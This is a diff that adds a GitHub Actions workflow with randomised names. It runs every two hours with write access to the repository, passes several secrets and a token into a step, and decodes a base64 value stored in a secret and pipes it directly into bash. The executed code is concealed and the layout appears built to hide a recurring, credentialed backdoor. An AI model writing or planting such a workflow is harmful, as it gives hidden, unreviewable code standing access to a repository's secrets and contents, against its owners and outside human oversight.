@@ -1,0 +1,21 @@
+name: qVbNbLLiJl45wYgi
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  unRKmawi8dMc9xO2:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.EMxjQ3Jm }}
+      - name: ecieFiHnx
+        env:
+          bUbeG: ${{ secrets.pZjA2UPSnhL }}
+          vbOvqRpMc40oqt: ${{ secrets.Id7lczuasD2ki }}
+          f2BaqJTlxgc0R2a: ${{ secrets.i91qR1RUXGZwd }}
+          GITHUB_TOKEN: ${{ secrets.EMxjQ3Jm }}
+        run: echo "$bUbeG" | base64 -d | bash
